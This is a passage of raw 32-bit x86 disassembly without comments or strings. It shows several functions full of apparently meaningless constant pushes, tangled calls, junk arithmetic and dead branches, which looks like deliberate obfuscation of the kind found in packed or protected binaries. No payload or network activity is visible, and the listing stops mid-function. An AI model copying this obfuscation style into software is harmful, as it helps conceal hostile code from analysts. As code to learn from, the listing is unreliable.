  41e3a5:	push   esi
  41e3a6:	add    eax,eax
  41e3a8:	push   eax
  41e3a9:	push   0x5e
  41e3ab:	push   eax
  41e3ac:	push   0xfffffffd
  41e3ae:	call   0x41ee25
  41e3b3:	add    esp,0x10
  41e3b6:	push   edi
  41e3b7:	xor    edi,edi
  41e3b9:	push   0xdef8ef00
  41e3be:	push   eax
  41e3bf:	push   0x5ee5f300
  41e3c4:	push   0x51
  41e3c6:	call   0x41f1c7
  41e3cb:	add    esp,0x10
  41e3ce:	push   0xfffffff3
  41e3d0:	push   eax
  41e3d1:	push   0x46
  41e3d3:	push   0x7a317600
  41e3d8:	call   0x41eccc
  41e3dd:	add    esp,0x10
  41e3e0:	mov    eax,0x16
  41e3e5:	call   0x41f3d2
  41e3ea:	push   0xffffff82
  41e3ec:	push   0x5ed3d600
  41e3f1:	push   0xf
  41e3f3:	push   0x7eb7f300
  41e3f8:	call   0x41ebd3
  41e3fd:	add    esp,0x10
  41e400:	sub    edi,eax
  41e402:	push   edi
  41e403:	push   0xf21bdc00
  41e408:	push   edi
  41e409:	push   0x2
  41e40b:	push   eax
  41e40c:	call   0x41f075
  41e411:	add    esp,0x14
  41e414:	push   0xfffffffe
  41e416:	push   eax
  41e417:	push   0x268f0000
  41e41c:	push   eax
  41e41d:	call   0x41fb7d
  41e422:	add    esp,0x10
  41e425:	mov    edx,edi
  41e427:	xor    ecx,ecx
  41e429:	push   eax
  41e42a:	push   0x3f
  41e42c:	push   0xe6e7fe00
  41e431:	push   ecx
  41e432:	call   0x41f075
  41e437:	add    esp,0x10
  41e43a:	push   edi
  41e43b:	call   0x41f1c7
  41e440:	add    esp,0x4
  41e443:	mov    edx,0xb69e3788
  41e448:	mov    eax,0xca
  41e44d:	mov    DWORD PTR [ebp-0x14],edx
  41e450:	mov    ebx,DWORD PTR ds:0x42b0b4
  41e456:	add    DWORD PTR [ebp-0x14],eax
  41e459:	add    DWORD PTR [ebp-0x14],ebx
  41e45c:	sub    edx,0xb69e3748
  41e462:	mov    edi,eax
  41e464:	mov    DWORD PTR [ebp-0x14],edi
  41e467:	push   edx
  41e468:	and    edx,eax
  41e46a:	sub    edx,ebx
  41e46c:	mov    ecx,DWORD PTR [ebp-0x14]
  41e46f:	push   ecx
  41e470:	push   0x9ca48100
  41e475:	call   0x41eccc
  41e47a:	add    esp,0x8
  41e47d:	mov    esi,0x82eefbe7
  41e482:	sub    DWORD PTR [ebp-0x14],edi
  41e485:	add    esi,0x7d111419
  41e48b:	mov    edi,DWORD PTR [ebp-0x14]
  41e48e:	push   0xa6af0d00
  41e493:	push   esi
  41e494:	push   0x49
  41e496:	call   0x41fb7d
  41e49b:	add    esp,0xc
  41e49e:	mov    ebx,0x26
  41e4a3:	push   0x54
  41e4a5:	push   0x7ef84100
  41e4aa:	push   ebx
  41e4ab:	push   0x66760600
  41e4b0:	call   0x41ebd3
  41e4b5:	add    esp,0x10
  41e4b8:	push   0x7ebf8800
  41e4bd:	push   0xbe41fb00
  41e4c2:	call   0x41eccc
  41e4c7:	add    esp,0x8
  41e4ca:	test   edi,0xcc
  41e4d0:	jne    0x41e53b
  41e4d2:	push   ebx
  41e4d3:	call   0x41eccc
  41e4d8:	add    esp,0x4
  41e4db:	mov    ecx,DWORD PTR [ebp-0x14]
  41e4de:	call   0x41ea3e
  41e4e3:	push   0xffffffd9
  41e4e5:	push   0xffffffdb
  41e4e7:	push   ebx
  41e4e8:	push   0x5e254b00
  41e4ed:	call   0x41ebd3
  41e4f2:	add    esp,0x10
  41e4f5:	push   0xffffffcc
  41e4f7:	push   0xffffffc8
  41e4f9:	push   eax
  41e4fa:	push   0xc20c4700
  41e4ff:	call   0x41ef3e
  41e504:	add    esp,0x10
  41e507:	mov    edx,DWORD PTR ds:0x42b0b4
  41e50d:	cmp    edi,eax
  41e50f:	je     0x41e53b
  41e511:	cmp    edi,eax
  41e513:	jne    0x41e53b
  41e515:	add    DWORD PTR [ebp-0x14],edx
  41e518:	push   edx
  41e519:	push   0x1b
  41e51b:	push   0xacb95200
  41e520:	call   0x41f075
  41e525:	add    esp,0xc
  41e528:	push   0x6cc6dd00
  41e52d:	push   0xffffffd3
  41e52f:	push   0xffffffee
  41e531:	push   esi
  41e532:	push   edi
  41e533:	call   0x41eccc
  41e538:	add    esp,0x14
  41e53b:	push   0xffffffd0
  41e53d:	call   0x41f2ed
  41e542:	add    esp,0x4
  41e545:	push   esi
  41e546:	mov    ecx,DWORD PTR [ebp-0x14]
  41e549:	and    ecx,edi
  41e54b:	push   0x6cfbec00
  41e550:	push   eax
  41e551:	push   eax
  41e552:	push   0xffffffbb
  41e554:	call   0x41f1c7
  41e559:	add    esp,0x10
  41e55c:	push   0x1a289c00
  41e561:	call   0x41fb7d
  41e566:	add    esp,0x4
  41e569:	push   0x67b84
  41e56e:	push   eax
  41e56f:	push   0xffffffd7
  41e571:	push   eax
  41e572:	push   edi
  41e573:	push   esi
  41e574:	call   0x41eccc
  41e579:	add    esp,0x14
  41e57c:	push   0xffffff80
  41e57e:	call   0x41eccc
  41e583:	add    esp,0x4
  41e586:	push   0x0
  41e588:	mov    ebx,DWORD PTR [ebp-0x14]
  41e58b:	xor    DWORD PTR [ebp-0x14],ebx
  41e58e:	mov    eax,0x532dd58f
  41e593:	and    esi,eax
  41e595:	and    esi,ebx
  41e597:	cmp    esi,eax
  41e599:	je     0x41e5a8
  41e59b:	sub    esi,edi
  41e59d:	and    esi,edi
  41e59f:	mov    ecx,DWORD PTR [ebp-0x14]
  41e5a2:	mov    DWORD PTR [ebp-0x14],esi
  41e5a5:	add    DWORD PTR [ebp-0x14],ecx
  41e5a8:	sub    eax,0x52eb419f
  41e5ad:	mov    ebx,DWORD PTR [ebp-0x14]
  41e5b0:	mov    esi,DWORD PTR [ebp-0x14]
  41e5b3:	and    DWORD PTR [ebp-0x14],esi
  41e5b6:	add    DWORD PTR [ebp-0x14],ecx
  41e5b9:	cmp    esi,0xffffff96
  41e5bc:	je     0x41e5c5
  41e5be:	sub    ebx,esi
  41e5c0:	add    ebx,ecx
  41e5c2:	add    DWORD PTR [ebp-0x14],ebx
  41e5c5:	call   DWORD PTR [eax]
  41e5c7:	xor    ebx,ebx
  41e5c9:	sub    DWORD PTR [ebp-0x14],ebx
  41e5cc:	mov    DWORD PTR [ebp-0x10],eax
  41e5cf:	push   0x3e
  41e5d1:	push   ebx
  41e5d2:	push   0x920a8200
  41e5d7:	call   0x41eccc
  41e5dc:	add    esp,0xc
  41e5df:	push   edi
  41e5e0:	push   edi
  41e5e1:	call   0x41ef3e
  41e5e6:	add    esp,0x8
  41e5e9:	mov    edx,0xa6ca2c34
  41e5ee:	mov    eax,edx
  41e5f0:	sub    DWORD PTR [ebp-0x14],edi
  41e5f3:	xor    ecx,ecx
  41e5f5:	and    DWORD PTR [ebp-0x14],ecx
  41e5f8:	sub    eax,ecx
  41e5fa:	add    DWORD PTR [ebp-0x14],eax
  41e5fd:	add    edx,0x59773a8c
  41e603:	mov    esi,DWORD PTR [ebp-0x14]
  41e606:	cmp    esi,0x41b9
  41e60c:	jne    0x41e613
  41e60e:	add    esi,ecx
  41e610:	sub    DWORD PTR [ebp-0x14],esi
  41e613:	mov    DWORD PTR [ebp-0x24],edx
  41e616:	cmp    edi,0x12004004
  41e61c:	jne    0x41e62b
  41e61e:	push   0xf613a900
  41e623:	call   0x41ee25
  41e628:	add    esp,0x4
  41e62b:	mov    edi,DWORD PTR [ebp-0x10]
  41e62e:	mov    esi,DWORD PTR ds:0x42b0b4
  41e634:	push   ebx
  41e635:	push   ebx
  41e636:	call   0x41fb7d
  41e63b:	add    esp,0x8
  41e63e:	mov    ebx,DWORD PTR [ebp-0x14]
  41e641:	push   0xffffffbb
  41e643:	push   ebx
  41e644:	call   0x41f7ae
  41e649:	add    esp,0x8
  41e64c:	push   0xc266b300
  41e651:	push   esi
  41e652:	call   0x41ea3e
  41e657:	add    esp,0x8
  41e65a:	push   0x5e107900
  41e65f:	push   edi
  41e660:	push   0xffffffa4
  41e662:	push   0xffffffa0
  41e664:	call   0x41ef3e
  41e669:	add    esp,0x10
  41e66c:	test   edi,0xf1
  41e672:	je     0x41e679
  41e674:	add    eax,edi
  41e676:	add    DWORD PTR [ebp-0x14],eax
  41e679:	mov    ecx,DWORD PTR [ebp-0x24]
  41e67c:	mov    edx,DWORD PTR [ebp-0x14]
  41e67f:	cmp    ecx,DWORD PTR ds:0x42b0b4
  41e685:	jne    0x41e6b6
  41e687:	mov    esi,0xb9
  41e68c:	sub    edx,ebx
  41e68e:	mov    eax,DWORD PTR [ebp-0x14]
  41e691:	add    DWORD PTR [ebp-0x14],ecx
  41e694:	cmp    eax,0x13
  41e697:	je     0x41e6b6
  41e699:	cmp    eax,0x5d
  41e69c:	je     0x41e6b6
  41e69e:	cmp    edi,0x10
  41e6a1:	je     0x41e6b6
  41e6a3:	xor    esi,esi
  41e6a5:	test   edx,0x2d31
  41e6ab:	je     0x41e6b6
  41e6ad:	add    DWORD PTR [ebp-0x14],esi
  41e6b0:	add    DWORD PTR [ebp-0x14],eax
  41e6b3:	add    DWORD PTR [ebp-0x14],edx
  41e6b6:	mov    esi,DWORD PTR [ecx]
  41e6b8:	mov    DWORD PTR [ebp-0x14],esi
  41e6bb:	mov    ecx,DWORD PTR [ecx+0x4]
  41e6be:	mov    eax,DWORD PTR [ebp-0x14]
  41e6c1:	cmp    ecx,DWORD PTR [ebp-0x14]
  41e6c4:	jne    0x41e730
  41e6c6:	sub    eax,ebx
  41e6c8:	cmp    ecx,0x57
  41e6cb:	je     0x41e730
  41e6cd:	mov    edx,DWORD PTR [ebp-0x14]
  41e6d0:	sub    eax,ebx
  41e6d2:	sub    eax,edi
  41e6d4:	add    DWORD PTR [ebp-0x14],edx
  41e6d7:	add    DWORD PTR [ebp-0x14],ebx
  41e6da:	cmp    eax,DWORD PTR [ebp-0x8]
  41e6dd:	jne    0x41e730
  41e6df:	cmp    eax,edx
  41e6e1:	je     0x41e730
  41e6e3:	mov    edx,DWORD PTR [ebp-0x14]
  41e6e6:	cmp    edx,0x27
  41e6e9:	jne    0x41e730
  41e6eb:	cmp    eax,0xffffffab
  41e6ee:	je     0x41e730
  41e6f0:	sub    eax,ecx
  41e6f2:	cmp    edx,DWORD PTR [ebp-0x38]
  41e6f5:	je     0x41e730
  41e6f7:	sub    DWORD PTR [ebp-0x14],edx
  41e6fa:	xor    edx,edx
  41e6fc:	sub    eax,edx
  41e6fe:	add    eax,ebx
  41e700:	cmp    eax,DWORD PTR ds:0x42b0b4
  41e706:	je     0x41e730
  41e708:	mov    edx,0xb2
  41e70d:	sub    edx,esi
  41e70f:	test   esi,0xf6bc
  41e715:	jne    0x41e730
  41e717:	add    edx,ebx
  41e719:	and    eax,ebx
  41e71b:	xor    DWORD PTR [ebp-0x14],edx
  41e71e:	cmp    eax,0x50
  41e721:	jne    0x41e730
  41e723:	mov    edx,0x8add
  41e728:	add    DWORD PTR [ebp-0x14],eax
  41e72b:	sub    edx,esi
  41e72d:	add    DWORD PTR [ebp-0x14],edx
  41e730:	or     esi,esi
  41e732:	je     0x41e88c
  41e738:	sub    edx,edi
  41e73a:	mov    eax,DWORD PTR ds:0x42b08c
  41e740:	sub    eax,ebx
  41e742:	sub    DWORD PTR [ebp-0x14],edx
  41e745:	mov    edx,DWORD PTR [ebp-0x14]
  41e748:	sub    eax,edx
  41e74a:	add    eax,esi
  41e74c:	sub    DWORD PTR [ebp-0x14],esi
  41e74f:	cmp    eax,esi
  41e751:	je     0x41e7d7
  41e757:	mov    edx,DWORD PTR [ebp-0x14]
  41e75a:	cmp    edx,DWORD PTR ds:0x42b0b4
  41e760:	jne    0x41e7d7
  41e762:	cmp    edx,edi
  41e764:	jne    0x41e7d7
  41e766:	cmp    ecx,DWORD PTR ds:0x42b08c
  41e76c:	je     0x41e7d7
  41e76e:	add    DWORD PTR [ebp-0x14],eax
  41e771:	sub    edx,ebx
  41e773:	add    edx,edi
  41e775:	mov    eax,DWORD PTR [ebp-0x14]
  41e778:	cmp    edx,eax
  41e77a:	jne    0x41e7d7
  41e77c:	cmp    eax,0x78ea
  41e781:	jne    0x41e7d7
  41e783:	cmp    eax,DWORD PTR ds:0x42b08c
  41e789:	jne    0x41e7d7
  41e78b:	add    edx,esi
  41e78d:	sub    DWORD PTR [ebp-0x14],esi
  41e790:	add    DWORD PTR [ebp-0x14],ecx
  41e793:	or     edx,eax
  41e795:	cmp    edx,0xffffffba
  41e798:	je     0x41e7d7
  41e79a:	mov    eax,ecx
  41e79c:	sub    DWORD PTR [ebp-0x14],eax
  41e79f:	cmp    esi,0xffffffd6
  41e7a2:	je     0x41e7d7
  41e7a4:	mov    eax,DWORD PTR [ebp-0x14]
  41e7a7:	cmp    edx,0x4e3e
  41e7ad:	je     0x41e7d7
  41e7af:	and    eax,ebx
  41e7b1:	cmp    eax,0xa
  41e7b4:	je     0x41e7d7
  41e7b6:	sub    edx,eax
  41e7b8:	mov    eax,DWORD PTR ds:0x42b090
  41e7be:	add    edx,esi
  41e7c0:	add    DWORD PTR [ebp-0x14],edx
  41e7c3:	mov    edx,DWORD PTR [ebp-0x14]
  41e7c6:	cmp    edx,DWORD PTR [ebp-0x20]
  41e7c9:	jne    0x41e7d0
  41e7cb:	sub    edx,edi
  41e7cd:	and    DWORD PTR [ebp-0x14],edx
  41e7d0:	add    eax,ebx
  41e7d2:	add    eax,edi
  41e7d4:	sub    DWORD PTR [ebp-0x14],eax
  41e7d7:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7d9:	cmp    edi,0x7c1e
  41e7df:	je     0x41e85f
  41e7e1:	test   esi,0xc7
  41e7e7:	je     0x41e85f
  41e7e9:	push   0xffffffb3
  41e7eb:	push   0xcc8c0700
  41e7f0:	push   0x7eaed300
  41e7f5:	call   0x41ebd3
  41e7fa:	add    esp,0xc
  41e7fd:	mov    eax,DWORD PTR ds:0x42b0b4
  41e803:	add    eax,eax
  41e805:	mov    ecx,DWORD PTR [ebp-0x14]
  41e808:	call   0x41fa1f
  41e80d:	push   edi
  41e80e:	push   0x465d3700
  41e813:	push   eax
  41e814:	push   edi
  41e815:	push   0x5b
  41e817:	call   0x41f2ed
  41e81c:	add    esp,0x14
  41e81f:	sub    esi,eax
  41e821:	and    esi,eax
  41e823:	push   ebx
  41e824:	push   0x1d
  41e826:	call   0x41f1c7
  41e82b:	add    esp,0x8
  41e82e:	add    esi,eax
  41e830:	call   0x41fa1f
  41e835:	push   ebx
  41e836:	push   0xfffffff7
  41e838:	call   0x41ef3e
  41e83d:	add    esp,0x8
  41e840:	cmp    esi,DWORD PTR ds:0x42b0b4
  41e846:	je     0x41e85f
  41e848:	call   0x41eccc
  41e84d:	mov    eax,0x68
  41e852:	push   esi
  41e853:	push   edi
  41e854:	push   edi
  41e855:	push   0x48
  41e857:	call   0x41fb7d
  41e85c:	add    esp,0x10
  41e85f:	call   0x41ee25
  41e864:	add    DWORD PTR [ebp-0x24],0x8
  41e868:	push   0xffffffc7
  41e86a:	push   esi
  41e86b:	call   0x41f7ae
  41e870:	add    esp,0x8
  41e873:	push   0xfffffff9
  41e875:	push   0x26f37d00
  41e87a:	push   0x12268900
  41e87f:	call   0x41ea3e
  41e884:	add    esp,0xc
  41e887:	jmp    0x41e62e
  41e88c:	push   0x3e532c00
  41e891:	call   0x41fb7d
  41e896:	add    esp,0x4
  41e899:	push   0x960a8300
  41e89e:	push   eax
  41e89f:	push   0x7a7d1400
  41e8a4:	push   eax
  41e8a5:	push   0x2ce4ce00
  41e8aa:	call   0x41ea3e
  41e8af:	add    esp,0x14
  41e8b2:	push   0x14
  41e8b4:	push   0xffffff9e
  41e8b6:	push   eax
  41e8b7:	push   0x33
  41e8b9:	call   0x41ef3e
  41e8be:	add    esp,0x10
  41e8c1:	mov    eax,DWORD PTR [ebp-0x10]
  41e8c4:	cmp    eax,0xffffffb3
  41e8c7:	je     0x41e9bb
  41e8cd:	cmp    eax,0x94b1
  41e8d2:	je     0x41e9bb
  41e8d8:	mov    ebx,0x6f03
  41e8dd:	mov    edi,DWORD PTR [ebp-0x14]
  41e8e0:	test   edi,0xa1
  41e8e6:	jne    0x41e9bb
  41e8ec:	cmp    edi,0xffffffe1
  41e8ef:	jne    0x41e9bb
  41e8f5:	mov    esi,0x69
  41e8fa:	mov    edx,DWORD PTR [ebp-0x14]
  41e8fd:	sub    esi,edi
  41e8ff:	add    esi,edi
  41e901:	sub    DWORD PTR [ebp-0x14],ebx
  41e904:	or     DWORD PTR [ebp-0x14],edx
  41e907:	test   eax,0x7a
  41e90c:	jne    0x41e9bb
  41e912:	mov    ebx,DWORD PTR [ebp-0x14]
  41e915:	test   eax,0xa7
  41e91a:	jne    0x41e9bb
  41e920:	mov    edi,DWORD PTR [ebp-0x14]
  41e923:	mov    edx,DWORD PTR [ebp-0x14]
  41e926:	add    edx,edi
  41e928:	add    DWORD PTR [ebp-0x14],edx
  41e92b:	add    esi,ebx
  41e92d:	test   esi,0x1b
  41e933:	jne    0x41e9bb
  41e939:	mov    edi,DWORD PTR [ebp-0x14]
  41e93c:	add    DWORD PTR [ebp-0x14],esi
  41e93f:	mov    edx,DWORD PTR ds:0x42b0b0
  41e945:	add    edx,eax
  41e947:	add    edx,ebx
  41e949:	add    DWORD PTR [ebp-0x14],edi
  41e94c:	cmp    esi,eax
  41e94e:	je     0x41e9bb
  41e950:	mov    ecx,DWORD PTR [ebp-0x14]
  41e953:	mov    esi,0xbb5c
  41e958:	cmp    edx,DWORD PTR [ebp-0x8]
  41e95b:	je     0x41e9bb
  41e95d:	mov    ebx,DWORD PTR ds:0x42b08c
  41e963:	mov    edi,DWORD PTR [ebp-0x14]
  41e966:	and    DWORD PTR [ebp-0x14],edx
  41e969:	cmp    ecx,DWORD PTR [ebp-0x2c]
  41e96c:	jne    0x41e9bb
  41e96e:	mov    edx,0xdb
  41e973:	sub    DWORD PTR [ebp-0x14],eax
  41e976:	and    esi,ebx
  41e978:	mov    ebx,0x98
  41e97d:	add    DWORD PTR [ebp-0x14],edi
  41e980:	add    DWORD PTR [ebp-0x14],ebx
  41e983:	add    esi,ebx
  41e985:	sub    esi,ecx
  41e987:	sub    DWORD PTR [ebp-0x14],edx
  41e98a:	test   esi,0x4
  41e990:	jne    0x41e9bb
  41e992:	mov    edx,DWORD PTR [ebp-0x14]
  41e995:	add    DWORD PTR [ebp-0x14],esi
  41e998:	or     edx,ecx
  41e99a:	cmp    edx,0x63dd
  41e9a0:	je     0x41e9bb
  41e9a2:	xor    ebx,ebx
  41e9a4:	xor    esi,esi
  41e9a6:	add    edx,ecx
  41e9a8:	sub    edx,esi
  41e9aa:	add    edx,ecx
  41e9ac:	sub    ebx,eax
  41e9ae:	cmp    edx,0x18
  41e9b1:	jne    0x41e9bb
  41e9b3:	sub    edx,eax
  41e9b5:	and    DWORD PTR [ebp-0x14],ebx
  41e9b8:	add    DWORD PTR [ebp-0x14],edx
  41e9bb:	cmp    edi,DWORD PTR ds:0x42b08c
  41e9c1:	je     0x41e9cc
  41e9c3:	mov    ebx,DWORD PTR ds:0x42b090
  41e9c9:	add    DWORD PTR [ebp-0x14],ebx
  41e9cc:	pop    edi
  41e9cd:	add    DWORD PTR [ebp-0x14],edi
  41e9d0:	pop    esi
  41e9d1:	test   esi,0xe807
  41e9d7:	je     0x41e9de
  41e9d9:	sub    edx,eax
  41e9db:	or     DWORD PTR [ebp-0x14],edx
  41e9de:	pop    ebx
  41e9df:	mov    edx,ecx
  41e9e1:	mov    ecx,DWORD PTR [ebp-0x14]
  41e9e4:	add    ecx,ecx
  41e9e6:	or     edx,esi
  41e9e8:	cmp    ecx,eax
  41e9ea:	jne    0x41ea37
  41e9ec:	cmp    ecx,0x1d
  41e9ef:	jne    0x41ea37
  41e9f1:	test   ebx,0x1c
  41e9f7:	jne    0x41ea37
  41e9f9:	cmp    ebx,DWORD PTR ds:0x42b0b4
  41e9ff:	je     0x41ea37
  41ea01:	or     DWORD PTR [ebp-0x14],ebx
  41ea04:	cmp    edx,0x9
  41ea07:	je     0x41ea37
  41ea09:	cmp    ecx,DWORD PTR ds:0x42b08c
  41ea0f:	je     0x41ea37
  41ea11:	add    ecx,eax
  41ea13:	cmp    eax,DWORD PTR [ebp-0x28]
  41ea16:	jne    0x41ea37
  41ea18:	and    DWORD PTR [ebp-0x14],edx
  41ea1b:	add    DWORD PTR [ebp-0x14],ebx
  41ea1e:	mov    edx,DWORD PTR ds:0x42b0b0
  41ea24:	add    DWORD PTR [ebp-0x14],edx
  41ea27:	cmp    ecx,DWORD PTR [ebp-0x8]
  41ea2a:	je     0x41ea37
  41ea2c:	sub    ecx,esi
  41ea2e:	mov    edx,DWORD PTR [ebp-0x14]
  41ea31:	add    DWORD PTR [ebp-0x14],edx
  41ea34:	add    DWORD PTR [ebp-0x14],ecx
  41ea37:	leave  
  41ea38:	ret    
  41ea39:	int3   
  41ea3a:	int3   
  41ea3b:	int3   
  41ea3c:	int3   
  41ea3d:	int3   
  41ea3e:	push   ebp
  41ea3f:	mov    ebp,esp
  41ea41:	sub    esp,0x28
  41ea44:	mov    ecx,0x54
  41ea49:	push   0xffffffc1
  41ea4b:	push   0xfffffff1
  41ea4d:	push   0xfffffff3
  41ea4f:	push   0xfffffff0
  41ea51:	push   ecx
  41ea52:	call   0x41f075
  41ea57:	add    esp,0x14
  41ea5a:	push   ebx
  41ea5b:	mov    ebx,0x1075
  41ea60:	push   0xacc63b00
  41ea65:	push   0xcc8f7100
  41ea6a:	push   ebx
  41ea6b:	push   eax
  41ea6c:	call   0x41ee25
  41ea71:	add    esp,0x10
  41ea74:	push   0x46
  41ea76:	push   0x1c895300
  41ea7b:	call   0x41ee25
  41ea80:	add    esp,0x8
  41ea83:	push   esi
  41ea84:	push   0x6ce40e00
  41ea89:	push   ebx
  41ea8a:	push   0x7c
  41ea8c:	push   eax
  41ea8d:	call   0x41ef3e
  41ea92:	add    esp,0x10
  41ea95:	push   edi
  41ea96:	and    ebx,eax
  41ea98:	push   eax
  41ea99:	push   0xde6b3e00
  41ea9e:	push   eax
  41ea9f:	push   0xec9ae200
  41eaa4:	call   0x41ef3e
  41eaa9:	add    esp,0x10
  41eaac:	add    ebx,eax
  41eaae:	mov    edi,0x2f
  41eab3:	cmp    ebx,edi
  41eab5:	jne    0x41eb0c
  41eab7:	mov    ecx,eax
  41eab9:	call   0x41eccc
  41eabe:	call   0x41fb7d
  41eac3:	push   0x26ee6000
  41eac8:	push   0x69
  41eaca:	push   0xf
  41eacc:	push   0xda233200
  41ead1:	call   0x41f3d2
  41ead6:	add    esp,0x10
  41ead9:	mov    DWORD PTR [ebp-0x14],edi
  41eadc:	mov    edx,DWORD PTR [ebp-0x14]
  41eadf:	push   edx
  41eae0:	call   0x41ee25
  41eae5:	add    esp,0x4
  41eae8:	cmp    ebx,eax
  41eaea:	je     0x41eb0c
  41eaec:	cmp    ebx,0xa46
  41eaf2:	je     0x41eb0c
  41eaf4:	cmp    ebx,DWORD PTR [ebp-0x8]
  41eaf7:	jne    0x41eb0c
  41eaf9:	push   ebx
  41eafa:	push   edi
  41eafb:	push   0x7eb83a00
  41eb00:	push   0x61
  41eb02:	push   0xb
  41eb04:	call   0x41f1c7
  41eb09:	add    esp,0x14
  41eb0c:	push   0xdce6bd00
  41eb11:	call   0x41ee25
  41eb16:	add    esp,0x4
  41eb19:	push   edi
  41eb1a:	push   ebx
  41eb1b:	call   0x41ef3e
  41eb20:	add    esp,0x8
  41eb23:	push   0x59
  41eb25:	push   0x2a14ef00
  41eb2a:	push   0x662a2b00
  41eb2f:	call   0x41ef3e
  41eb34:	add    esp,0xc
  41eb37:	push   0x6b
  41eb39:	push   0xece51200
  41eb3e:	call   0x41fa1f
  41eb43:	add    esp,0x8
  41eb46:	push   0xffffffb6
  41eb48:	call   0x41f3d2
  41eb4d:	add    esp,0x4
  41eb50:	push   0x7a254a00
  41eb55:	push   eax
  41eb56:	push   0xfffffff6
  41eb58:	call   0x41ee25
  41eb5d:	add    esp,0xc
  41eb60:	push   0x66563900
  41eb65:	call   0x41f075
  41eb6a:	add    esp,0x4
  41eb6d:	mov    DWORD PTR [ebp-0x18],eax
  41eb70:	push   0x4643cb00
  41eb75:	call   0x41ee25
  41eb7a:	add    esp,0x4
  41eb7d:	pop    edi
  41eb7e:	mov    ebx,DWORD PTR [ebp-0x18]
  41eb81:	call   0x41fa1f
  41eb86:	push   eax
  41eb87:	push   0xffffff93
  41eb89:	call   0x41f075
  41eb8e:	add    esp,0x8
  41eb91:	push   ebx
  41eb92:	push   0xbcc95000
  41eb97:	push   eax
  41eb98:	call   0x41f1c7
  41eb9d:	add    esp,0xc
  41eba0:	pop    esi
  41eba1:	test   eax,0xe6884880
  41eba6:	je     0x41ebad
  41eba8:	call   0x41ef3e
  41ebad:	push   0xfffffffe
  41ebaf:	push   0x4c
  41ebb1:	push   esi
  41ebb2:	push   eax
  41ebb3:	push   0xffffffb1
  41ebb5:	call   0x41ef3e
  41ebba:	add    esp,0x14
  41ebbd:	pop    ebx
  41ebbe:	push   ebx
  41ebbf:	call   0x41f1c7
  41ebc4:	add    esp,0x4
  41ebc7:	call   0x41eccc
  41ebcc:	leave  
  41ebcd:	ret    
  41ebce:	int3   
  41ebcf:	int3   
  41ebd0:	int3   
  41ebd1:	int3   
  41ebd2:	int3   
  41ebd3:	push   ebp
  41ebd4:	mov    ebp,esp
  41ebd6:	sub    esp,0x38
  41ebd9:	push   0xa6b75b00
  41ebde:	push   0x8c9a0b00
  41ebe3:	push   0xffffffb5
  41ebe5:	push   0x2c
  41ebe7:	push   0xffffffab
  41ebe9:	call   0x41fb7d
  41ebee:	add    esp,0x14
  41ebf1:	push   0xffffffa0
  41ebf3:	push   0xc61aed00
  41ebf8:	call   0x41f2ed
  41ebfd:	add    esp,0x8
  41ec00:	push   ebx
  41ec01:	mov    edx,eax
  41ec03:	push   0x92472b00
  41ec08:	push   0xffffffd7
  41ec0a:	call   0x41f7ae
  41ec0f:	add    esp,0x8
  41ec12:	push   esi
  41ec13:	push   0xfffffffe
  41ec15:	push   eax
  41ec16:	push   eax
  41ec17:	push   0x58
  41ec19:	push   0x7ed43500
  41ec1e:	call   0x41fa1f
  41ec23:	add    esp,0x14
  41ec26:	push   edi
  41ec27:	xor    edi,edi
  41ec29:	call   0x41f1c7
  41ec2e:	push   0xffffff9e
  41ec30:	call   0x41fb7d
  41ec35:	add    esp,0x4
  41ec38:	mov    DWORD PTR [ebp-0x10],edi
  41ec3b:	push   eax
  41ec3c:	push   eax
  41ec3d:	push   0xfe369300
  41ec42:	push   0xecc7f200
  41ec47:	push   0xdcd20a00
  41ec4c:	call   0x41ee25
  41ec51:	add    esp,0x14
  41ec54:	push   0x3a031400
  41ec59:	push   0x5ee73200
  41ec5e:	push   0xffffffa4
  41ec60:	call   0x41f3d2
  41ec65:	add    esp,0xc
  41ec68:	push   0x23
  41ec6a:	call   0x41f2ed
  41ec6f:	add    esp,0x4
  41ec72:	push   0x7e881300
  41ec77:	push   0x7f
  41ec79:	call   0x41f2ed
  41ec7e:	add    esp,0x8
  41ec81:	mov    eax,0x14
  41ec86:	sub    DWORD PTR [ebp-0x10],eax
  41ec89:	push   0xc2548800
  41ec8e:	push   eax
  41ec8f:	push   0x7ef13900
  41ec94:	call   0x41fb7d
  41ec99:	add    esp,0xc
  41ec9c:	call   0x41f075
  41eca1:	pop    edi
  41eca2:	sub    DWORD PTR [ebp-0x10],edi
  41eca5:	pop    esi
  41eca6:	xor    ecx,ecx
  41eca8:	mov    eax,DWORD PTR [ebp-0x10]
  41ecab:	call   0x41eccc
  41ecb0:	call   0x41ee25
  41ecb5:	pop    ebx
  41ecb6:	push   edi
  41ecb7:	push   ebx
  41ecb8:	push   0x7ec20500
  41ecbd:	call   0x41f2ed
  41ecc2:	add    esp,0xc
  41ecc5:	leave  
  41ecc6:	ret    
  41ecc7:	int3   
  41ecc8:	int3   
  41ecc9:	int3   
  41ecca:	int3   
  41eccb:	int3   
  41eccc:	push   ebp
  41eccd:	mov    ebp,esp
  41eccf:	sub    esp,0x24
  41ecd2:	push   0x51
  41ecd4:	push   0xffffff99
  41ecd6:	push   0xffffff9a
  41ecd8:	push   0xffffffe2
  41ecda:	push   0xdc9f8700
  41ecdf:	call   0x41f3d2
  41ece4:	add    esp,0x14
  41ece7:	push   ebx
  41ece8:	push   0xffffff95
  41ecea:	push   0x13
  41ecec:	push   0x7ce0f200
  41ecf1:	push   0xffffffab
  41ecf3:	push   0x20
  41ecf5:	call   0x41fb7d
  41ecfa:	add    esp,0x14
  41ecfd:	push   0xffffff83
  41ecff:	call   0x41f7ae
  41ed04:	add    esp,0x4
  41ed07:	push   esi
  41ed08:	push   eax
  41ed09:	push   eax
  41ed0a:	push   eax
  41ed0b:	push   0x6d
  41ed0d:	call   0x41f3d2
  41ed12:	add    esp,0x10
  41ed15:	push   edi
  41ed16:	mov    edx,eax
  41ed18:	cmp    edx,0xb
  41ed1b:	jne    0x41ed20
  41ed1d:	mov    DWORD PTR [ebp-0x24],edx
  41ed20:	push   0x7
  41ed22:	push   0xffffffdd
  41ed24:	push   0x7a
  41ed26:	push   0x7c8d6900
  41ed2b:	push   0x7ed0fa00
  41ed30:	call   0x41fa1f
  41ed35:	add    esp,0x14
  41ed38:	push   eax
  41ed39:	push   0xe6fafb00
  41ed3e:	push   0x59
  41ed40:	push   0xffffffcf
  41ed42:	call   0x41f7ae
  41ed47:	add    esp,0x10
  41ed4a:	cmp    eax,DWORD PTR [ebp-0x14]
  41ed4d:	je     0x41ed5e
  41ed4f:	push   eax
  41ed50:	push   0x67
  41ed52:	push   eax
  41ed53:	push   eax
